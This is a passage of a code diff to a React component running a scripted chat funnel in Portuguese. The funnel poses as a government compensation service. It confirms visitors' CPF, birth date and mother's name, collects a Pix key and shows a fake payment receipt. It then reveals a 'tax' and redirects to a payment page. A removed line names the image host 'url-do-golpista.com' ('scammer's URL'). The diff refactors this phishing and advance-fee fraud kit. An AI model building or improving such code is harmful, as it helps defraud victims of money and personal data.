@@ -69,6 +69,7 @@ interface FlowStepDataDisplayDynamicImage {
 }
 
 interface FlowStep {
+  key: string; // Added key to FlowStep for robust step checking
   type: 'displayVideo' | 'multipleChoice' | 'loading' | 'displayMessage' | 'textInput' | 'displayDynamicImage';
   delay_ms?: number;
   data: FlowStepDataDisplayVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayDynamicImage;
@@ -86,6 +87,7 @@ interface Message {
   displayIcon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
 }
 
+// Add key to each step in the funnelDefinition
 const funnelDefinition: {
   funnelName: string;
   initialStep: string;
@@ -101,6 +103,7 @@ const funnelDefinition: {
   },
   "steps": {
     "step1_video": {
+      "key": "step1_video",
       "type": "displayVideo",
       "delay_ms": 1000,
       "data": {
@@ -111,6 +114,7 @@ const funnelDefinition: {
       "nextStep": "step2_intro_and_ask_mother"
     },
     "step2_intro_and_ask_mother": {
+      "key": "step2_intro_and_ask_mother",
       "type": "multipleChoice",
       "delay_ms": 2500,
       "data": {
@@ -124,6 +128,7 @@ const funnelDefinition: {
       }
     },
     "step3_ask_civil_status": {
+      "key": "step3_ask_civil_status",
       "type": "multipleChoice",
       "delay_ms": 1500,
       "data": {
@@ -137,6 +142,7 @@ const funnelDefinition: {
       }
     },
     "step4_loading_validation": {
+      "key": "step4_loading_validation",
       "type": "loading",
       "delay_ms": 500,
       "data": {
@@ -146,6 +152,7 @@ const funnelDefinition: {
       "nextStep": "step5_confirmation_and_audio"
     },
     "step5_confirmation_and_audio": {
+      "key": "step5_confirmation_and_audio",
       "type": "displayMessage",
       "delay_ms": 500,
       "data": {
@@ -163,6 +170,7 @@ const funnelDefinition: {
       "nextStep": "step6_ask_pix_type"
     },
     "step6_ask_pix_type": {
+      "key": "step6_ask_pix_type",
       "type": "multipleChoice",
       "delay_ms": 2500,
       "data": {
@@ -175,6 +183,7 @@ const funnelDefinition: {
       }
     },
     "step7_confirm_pix_key": {
+      "key": "step7_confirm_pix_key",
       "type": "multipleChoice",
       "delay_ms": 1500,
       "data": {
@@ -186,6 +195,7 @@ const funnelDefinition: {
       }
     },
     "step7_input_pix_key": {
+      "key": "step7_input_pix_key",
       "type": "textInput",
       "delay_ms": 1000,
       "data": {
@@ -196,6 +206,7 @@ const funnelDefinition: {
       "nextStep": "step7b_confirm_manual_pix_key"
     },
     "step7b_confirm_manual_pix_key": {
+        "key": "step7b_confirm_manual_pix_key",
         "type": "multipleChoice",
         "delay_ms": 1500,
         "data": {
@@ -207,6 +218,7 @@ const funnelDefinition: {
         }
     },
     "step8_loading_pix_registration": {
+      "key": "step8_loading_pix_registration",
       "type": "loading",
       "delay_ms": 500,
       "data": {
@@ -216,6 +228,7 @@ const funnelDefinition: {
       "nextStep": "step9_pix_registered_and_audio"
     },
     "step9_pix_registered_and_audio": {
+      "key": "step9_pix_registered_and_audio",
       "type": "displayMessage",
       "delay_ms": 500,
       "data": {
@@ -232,6 +245,7 @@ const funnelDefinition: {
       "nextStep": "step10_ask_generate_receipt"
     },
     "step10_ask_generate_receipt": {
+      "key": "step10_ask_generate_receipt",
       "type": "multipleChoice",
       "delay_ms": 3500,
       "data": {
@@ -242,12 +256,13 @@ const funnelDefinition: {
       }
     },
     "step11_generating_receipt_image": {
+      "key": "step11_generating_receipt_image",
       "type": "displayDynamicImage",
       "delay_ms": 1000,
       "data": {
         "message": "Gerando seu comprovante de recebimento dos valores...",
-        "templateUrl": "https://url-do-golpista.com/images/comprovante_template.png",
-         "imageAiHint": "receipt screenshot",
+        "templateUrl": "https://i.imgur.com/J8z6Y7z.png", // Generic placeholder
+        "imageAiHint": "receipt screenshot",
         "imageAltText": "Comprovante Gerado",
         "dataMapping": [
           {"variable": "{{userName}}", "x": 50, "y": 120, "font": "Arial", "size": 12},
@@ -259,6 +274,7 @@ const funnelDefinition: {
       "nextStep": "step12_reveal_tax_and_audio"
     },
     "step12_reveal_tax_and_audio": {
+      "key": "step12_reveal_tax_and_audio",
       "type": "displayMessage",
       "delay_ms": 3000,
       "data": {
@@ -274,6 +290,7 @@ const funnelDefinition: {
       "nextStep": "step13_final_justification_and_cta"
     },
     "step13_final_justification_and_cta": {
+      "key": "step13_final_justification_and_cta",
       "type": "multipleChoice",
       "delay_ms": 4000,
       "data": {
@@ -291,10 +308,10 @@ const funnelDefinition: {
 };
 
 
-const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_1';
-const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
-const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
-const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1';
+const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_2';
+const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_2';
+const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_2';
+const STORAGE_KEY_SESSION_ID = 'simulatedChatSessionId_v2_2';
 
 const DEFAULT_APPEARANCE_DELAY_MS = 500;
 
@@ -348,10 +365,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   useEffect(() => {
     if (typeof window === 'undefined') return;
 
-    const currentCpfFromParams = initialParams.cpf;
-    const currentNameFromParams = initialParams.nome;
-    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
-    const storedSessionIdentifier = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);
+    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
+    const storedSessionId = sessionStorage.getItem(STORAGE_KEY_SESSION_ID);
 
     let shouldResetChat = false;
 
@@ -363,12 +378,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         userCPF: initialParams.cpf || '---.---.---.--',
         userBirthDate: initialParams.nascimento || '--/--/----',
         userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
-        randomMotherName1: 'Maria da Silva Souza',
+        randomMotherName1: 'Maria da Silva Souza', // Example, consider making these dynamic if needed
         randomMotherName2: 'Joana Oliveira Costa',
-        chavePix: initialParams.cpf || '---.---.---.--',
+        chavePix: initialParams.cpf || '---.---.---.--', // Default to user's CPF
     };
 
-    if (currentCpfFromParams && storedSessionIdentifier === sessionIdentifier) {
+    if (initialParams.cpf && storedSessionId === currentSessionId) {
       const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
       const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
       const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);
@@ -382,9 +397,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       const newFlowVariables = { ...defaultFlowVars };
       if (savedFlowVars) {
         const parsedSaved = JSON.parse(savedFlowVars);
-        newFlowVariables.chavePix = parsedSaved.chavePix || defaultFlowVars.chavePix;
-        Object.keys(defaultGlobalVars).forEach(key => {
-            if (parsedSaved[key] !== undefined) newFlowVariables[key] = parsedSaved[key];
+        // Only restore variables that are meant to be persisted or are global
+        Object.keys(parsedSaved).forEach(key => {
+            if (key in defaultGlobalVars || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
+                 newFlowVariables[key] = parsedSaved[key];
+            }
         });
       }
       setFlowVariables(newFlowVariables);
@@ -397,10 +414,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
       sessionStorage.removeItem(STORAGE_KEY_STEP);
       sessionStorage.removeItem(STORAGE_KEY_VARIABLES);
-      if (currentCpfFromParams) {
-        sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, sessionIdentifier);
+      if (initialParams.cpf) {
+        sessionStorage.setItem(STORAGE_KEY_SESSION_ID, currentSessionId);
       } else {
-        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF);
+        sessionStorage.removeItem(STORAGE_KEY_SESSION_ID);
       }
       setMessages([]);
       setCurrentStepKey(funnelDefinition.initialStep);
@@ -408,34 +425,28 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       prevCurrentStepKeyRef.current = undefined;
       justLoadedSessionRef.current = false;
     }
-  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]);
+  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); // Added all relevant initialParams
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
-    const currentCpfFromParams = initialParams.cpf;
-    const currentNameFromParams = initialParams.nome;
-    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
-    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
+    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
+    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
       sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
     }
   }, [messages, initialParams.cpf, initialParams.nome]);
 
   useEffect(() => {
      if (typeof window === 'undefined') return;
-    const currentCpfFromParams = initialParams.cpf;
-    const currentNameFromParams = initialParams.nome;
-    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
-    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
+    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
+    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
       sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
     }
   }, [currentStepKey, initialParams.cpf, initialParams.nome]);
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
-    const currentCpfFromParams = initialParams.cpf;
-    const currentNameFromParams = initialParams.nome;
-    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
-    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
+    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
+    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
       const persistableFlowVariables: Record<string, any> = {};
       Object.keys(flowVariables).forEach(key => {
         if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
@@ -451,11 +462,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (!text) return '';
     let formattedText = text;
     const allVars = {
-        ...initialParams,
+        ...initialParams, // gclid, utm_source etc.
         ...(funnelDefinition.globalVariables || {}),
-        ...flowVariables,
+        ...flowVariables, // userName, userCPF, userBirthDate, userMotherName, chavePix, indenizacaoValor etc.
     };
 
+    // Ensure specific flowVariables override initialParams if they exist (e.g. if userCPF was modified by flow)
     allVars.userName = flowVariables.userName || initialParams.nome || 'Usuário';
     allVars.userCPF = flowVariables.userCPF || initialParams.cpf || '---.---.---.--';
     allVars.userBirthDate = flowVariables.userBirthDate || initialParams.nascimento || '--/--/----';
@@ -466,15 +478,18 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       const placeholder = `{{${key}}}`;
       let valueToInsert = String(allVars[key]);
 
+      // Basic formatting for CPF and Date, can be expanded
       if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
-        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
+        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { // Raw 11-digit CPF
             valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
-        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
+            // Already formatted, do nothing
+        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { // YYYY-MM-DD or ISO string
             const datePart = valueToInsert.split('T')[0];
             const parts = datePart.split('-');
-            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
+            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`; // DD/MM/YYYY
         }
+        // Capitalize names if they are all lowercase (simple heuristic)
         else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) {
              valueToInsert = valueToInsert
                 .split(' ')
@@ -483,6 +498,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
       } else {
+         // Replace with a placeholder if value is undefined/null
          formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
       }
     }
@@ -507,8 +523,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     setCurrentImageDetails(null);
     setIsLoadingStep(false);
     setLoadingMessage(null);
-    // Do not clear currentVideoData here, as the video might still be playing or just ended
-    // setCurrentVideoData(null); 
+    // setCurrentVideoData(null); // Clear video data after interaction
     setIsTextInputActive(false);
     setCurrentTextInputConfig(null);
 
@@ -522,7 +537,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   useEffect(() => {
     if (typeof window === 'undefined') return;
 
-    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;
+    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
 
     if (!stepConfig) {
       console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
@@ -532,7 +547,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       setIsBotTyping(false);
       return;
     }
-
+    
     setIsBotTyping(true);
 
     if (autoTransitionTimerRef.current) {
@@ -541,10 +556,14 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     }
 
     const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
+    // Process as new step if it's actually a new step AND session wasn't just loaded,
+    // OR if it's a video step being loaded from session (video needs explicit UI setup).
     let processAsNewStep = (isNewStep && !justLoadedSessionRef.current) ||
                            (justLoadedSessionRef.current && stepConfig.type === 'displayVideo' && isNewStep);
 
     if (isNewStep && !(justLoadedSessionRef.current && stepConfig.type === 'displayVideo')) {
+      // Clear previous step's specific UI elements if it's a genuinely new step
+      // and not a video step being restored from session (which needs its UI).
       setIsLoadingStep(false);
       setLoadingMessage(null);
       setCurrentImageDetails(null);
@@ -561,6 +580,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     const typingTimer = setTimeout(() => {
       const processStepAfterDelayInternal = () => {
         if (processAsNewStep) {
+          // This logic runs when it's a brand new step (not from session resume, or it's a video step needing init)
           switch (stepConfig.type) {
             case 'displayVideo': {
               const data = stepConfig.data as FlowStepDataDisplayVideo;
@@ -571,6 +591,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               });
               setShowVideoSoundOverlay(true);
               setIsVideoMuted(true);
+              // For video, we don't automatically move to nextStep here; interaction handles it.
               break;
             }
             case 'multipleChoice': {
@@ -584,10 +605,14 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setLoadingMessage(formatText(data.message));
               setIsLoadingStep(true);
               autoTransitionTimerRef.current = setTimeout(() => {
-                if (prevCurrentStepKeyRef.current === currentStepKey) { // Check if still on the same step
+                if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) { 
                   setIsLoadingStep(false);
                   setLoadingMessage(null);
-                  if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
+                  if (stepConfig.nextStep) {
+                    handleUserActionAndNavigate(stepConfig.nextStep);
+                  } else {
+                     console.warn("Loading step ended but no nextStep defined for:", currentStepKey);
+                  }
                 }
               }, data.duration_ms);
               break;
@@ -601,7 +626,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 displayDetails: formatDetailsObject(data.details),
                 displayIcon: data.icon,
               };
-              setCurrentDisplayMessage(displayMsgData);
+              setCurrentDisplayMessage(displayMsgData); // Set current display message
               if (data.audioUrl && audioRef.current) {
                 audioRef.current.src = data.audioUrl;
                 audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
@@ -613,7 +638,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
               setCurrentTextInputConfig(data);
               setIsTextInputActive(true);
-              setTextInputValue("");
+              setTextInputValue(""); // Clear previous input
               break;
             }
              case 'displayDynamicImage': {
@@ -622,12 +647,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               const messageToShow = formatText(data.message) || "Gerando seu comprovante...";
                if (data.templateUrl) {
                 setCurrentImageDetails({
-                    url: data.templateUrl,
+                    url: data.templateUrl, // Use the template URL directly for now
                     alt: formatText(data.imageAltText) || "Comprovante",
                     message: messageToShow,
                     aiHint: data.imageAiHint
                 });
               } else {
+                // If no template URL, just show the message
                 setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
               }
               break;
@@ -637,11 +663,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
           }
         } else if (isNewStep && justLoadedSessionRef.current) {
-          // Logic for restoring state when session is loaded
+          // This logic runs when a session is loaded and it's a new step key (but not video, handled above)
+          // Essentially, restore the UI for the current step based on session data.
           if (stepConfig.type === 'multipleChoice') {
             const lastMessage = messages[messages.length - 1];
             const data = stepConfig.data as FlowStepDataMultipleChoice;
             const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
+            // Only add if the last message isn't already this one (e.g. user reloaded on this step)
             if (messages.length === 0 || (lastMessage && lastMessage.sender === 'user') || (lastMessage && !lastMessage.options) || (lastMessage && stepConfig.type === 'multipleChoice' && (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions)))) {
                setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
             }
@@ -678,19 +706,14 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                         setMessages(prev => [...prev, { id: `bot-session-load-dynimg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
                     }
                 }
-          } else if (stepConfig.type === 'displayVideo') {
-            const data = stepConfig.data as FlowStepDataDisplayVideo;
-            setCurrentVideoData({
-                videoUrl: data.videoUrl,
-                introductoryMessage: data.message ? formatText(data.message) : undefined,
-                thumbnailText: data.thumbnailText || "Clique para ativar o som"
-            });
-            setShowVideoSoundOverlay(true);
-            setIsVideoMuted(true);
           }
+          // No specific restore for 'loading' or 'displayVideo' here as they are handled by processAsNewStep or initial conditions
         } else {
-          // Logic for re-rendering current step if variables change (e.g. after text input)
+          // This can be used for re-rendering current step if variables change, e.g. after text input
+          // For instance, if a displayMessage step shows a variable that was just set by a textInput.
+          // This part might need more specific logic if complex re-renders are needed.
           if (currentDisplayMessage) {
+             // Refresh currentDisplayMessage if its content depends on flowVariables that might have changed
              const currentStepData = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
               if (currentStepData && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).type === 'displayMessage') {
                    setCurrentDisplayMessage(prev => prev ? {
@@ -703,22 +726,26 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           }
         }
         
-        setIsBotTyping(false); // Set to false after processing the step content
+        setIsBotTyping(false);
 
 
-        // Auto-transition logic for non-interactive steps
+        // Auto-transition logic for non-interactive steps (displayMessage, displayDynamicImage)
+        // This should only happen if the step was newly processed
         const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                   (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');
 
+        // Default transition delays, can be fine-tuned
         let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
-        if (stepConfig.type === 'displayMessage' && !(stepConfig.data as FlowStepDataDisplayMessage).details) {
+        if (stepConfig.type === 'displayMessage' && !(stepConfig.data as FlowStepDataDisplayMessage).details && !(stepConfig.data as FlowStepDataDisplayMessage).audioUrl) {
+            // Shorter delay for simple messages without details or audio
             nextStepTransitionDelayMs = (stepConfig.data as FlowStepDataDisplayMessage).message ? 2500 : 1200;
         }
 
 
         if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current))) {
           autoTransitionTimerRef.current = setTimeout(() => {
-             if (prevCurrentStepKeyRef.current === currentStepKey) { // Check if still on the same step
+             // Check if still on the same step, prevents race conditions if user quickly navigates
+             if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) { 
                handleUserActionAndNavigate(stepConfig.nextStep as string);
             }
           }, nextStepTransitionDelayMs);
@@ -728,6 +755,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       processStepAfterDelayInternal();
 
       if (justLoadedSessionRef.current && isNewStep) {
+          // Reset after the first new step processing post-session load
           justLoadedSessionRef.current = false;
       }
 
@@ -744,7 +772,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         autoTransitionTimerRef.current = null;
       }
     };
-  }, [currentStepKey, initialParams]); // Removed flowVariables
+  }, [currentStepKey, initialParams]);
 
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -752,31 +780,39 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
 
   const handleOptionClick = (option: ChatOption) => {
-    if (!option.text) {
-      console.warn("SimulatedChatFlow: Option clicked with no text.");
+    if (!option.text && option.text !== "") { // Allow empty string as a valid text if needed by design
+      console.warn("SimulatedChatFlow: Option clicked with no text property.");
       return;
     }
     
     const userMessageId = `user-${Date.now()}`;
-    setMessages(prevMsgs => {
-      // Add user's reply
-      const msgsWithUserReply = [...prevMsgs, { id: userMessageId, sender: 'user', text: option.text }];
-      
-      // Find the bot message that was replied to and remove its options
-      const repliedToBotMessageIndex = msgsWithUserReply.slice(0, -1).reverse().findIndex(
-        (msg) => msg.sender === 'bot' && msg.options && msg.options.length > 0
-      );
+    // Add user's reply first
+    setMessages(prevMsgs => [...prevMsgs, { id: userMessageId, sender: 'user', text: option.text }]);
 
-      if (repliedToBotMessageIndex !== -1) {
-        const originalIndex = msgsWithUserReply.length - 2 - repliedToBotMessageIndex;
-        const finalMsgs = [...msgsWithUserReply];
-        finalMsgs[originalIndex] = { ...finalMsgs[originalIndex], options: undefined };
-        return finalMsgs;
-      }
-      return msgsWithUserReply;
+    // Then, disable options on the bot message that was just replied to
+    setMessages(prevMsgs => {
+        const msgsWithUserReply = [...prevMsgs]; // prevMsgs already contains the user reply from above
+        const repliedToBotMessageIndex = msgsWithUserReply.slice(0, -1).reverse().findIndex(
+            (msg) => msg.sender === 'bot' && msg.options && msg.options.length > 0
+        );
+
+        if (repliedToBotMessageIndex !== -1) {
+            const originalIndex = msgsWithUserReply.length - 2 - repliedToBotMessageIndex;
+            msgsWithUserReply[originalIndex] = { ...msgsWithUserReply[originalIndex], options: undefined };
+            return msgsWithUserReply;
+        }
+        return msgsWithUserReply; // Should not happen if options were present
     });
     
-    setIsBotTyping(true); // Start typing indicator immediately
+    // Clear specific UI from previous step and set typing
+    setCurrentDisplayMessage(null); 
+    setCurrentImageDetails(null);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setCurrentVideoData(null);
+    setIsTextInputActive(false);
+    setCurrentTextInputConfig(null);
+    setIsBotTyping(true);
 
     if (option.action === 'setChavePixToUserCPF') {
         const cpfToSet = flowVariables.userCPF || "CPF não disponível";
@@ -793,25 +829,33 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 }
             });
             if (initialParams.cpf && !url.searchParams.has('cpf')) url.searchParams.set('cpf', initialParams.cpf);
+            // Add other flowVariables if needed by payment page
+            if (flowVariables.chavePix && !url.searchParams.has('chave_pix')) url.searchParams.set('chave_pix', flowVariables.chavePix);
+            if (flowVariables.indenizacaoValor && !url.searchParams.has('valor_indenizacao')) url.searchParams.set('valor_indenizacao', flowVariables.indenizacaoValor);
+             if (flowVariables.taxaValor && !url.searchParams.has('valor_taxa')) url.searchParams.set('valor_taxa', flowVariables.taxaValor);
+
+
             window.location.href = url.toString();
         } catch (e) {
             console.error("Invalid payment URL:", finalPaymentUrl, e);
             setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
         }
-        setIsBotTyping(false);
-        return;
+        setIsBotTyping(false); // Stop typing if redirecting
+        return; 
     }
     
     handleUserActionAndNavigate(option.nextStep);
   };
 
-  const handleVideoSoundOverlayClick = () => {
+  const handleVideoThumbnailClick = () => {
     if (videoPlayerRef.current) {
       videoPlayerRef.current.muted = false;
       setIsVideoMuted(false);
       videoPlayerRef.current.play().catch(e => console.warn("Error trying to play video after unmuting:", e));
     }
     setShowVideoSoundOverlay(false);
+    // Do not navigate here; let onEnded handle it or if specified, video can be a gate.
+    // For this flow, onEnded will navigate.
   };
 
   const handleVideoEnded = () => {
@@ -834,12 +878,21 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     }
 
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
-    setIsBotTyping(true); // Start typing immediately
+    
+    // Clear previous step's UI and set typing
+    setCurrentDisplayMessage(null);
+    setCurrentImageDetails(null);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setCurrentVideoData(null);
+    setIsTextInputActive(false); // Will be set by next step if it's also textInput
+    // setCurrentTextInputConfig(null); // Let the next step config handle this if it's another text input
+    setIsBotTyping(true);
 
     if (currentTextInputConfig.variableToSet === 'chavePix') {
         setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
     }
-    setTextInputValue("");
+    setTextInputValue(""); // Clear the input field
     
     const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
     handleUserActionAndNavigate(nextStepKey);
@@ -849,10 +902,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (!iconName) return null;
     if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
     if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
+    // Example: if you used 'currency_dollar_gov_style' in JSON
     if (iconName.includes('currency_dollar_gov_style')) {
+      // Replace with an appropriate Lucide icon or an inline SVG/Emoji if needed
       return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
     }
-    return null;
+    return null; // Default case or for other string icons
   }
 
 
@@ -888,7 +943,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             />
             {showVideoSoundOverlay && (
               <div
-                onClick={handleVideoSoundOverlayClick}
+                onClick={handleVideoThumbnailClick}
                 style={{
                   position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                   background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
@@ -905,13 +960,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         </div>
       )}
 
-
-      {isLoadingStep && loadingMessage && !isBotTyping && (
-        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
-          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
-          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
-        </div>
-      )}
 
       {currentImageDetails && !isBotTyping && !isLoadingStep && (
         <div className="message-container bot-message-container image-display-block">
@@ -979,6 +1027,17 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             </div>
           </div>
         )
+      )}
+
+      {isLoadingStep && loadingMessage && !isBotTyping && (
+        <div className="message-container bot-message-container loading-step-as-message">
+          <div className="message bot-message" style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+            <Loader2 className="animate-spin" size={24} style={{ color: '#1451b4', flexShrink: 0 }} />
+            <p style={{ fontSize: '15px', color: '#333', whiteSpace: 'pre-line', margin: 0 }}>
+              {loadingMessage}
+            </p>
+          </div>
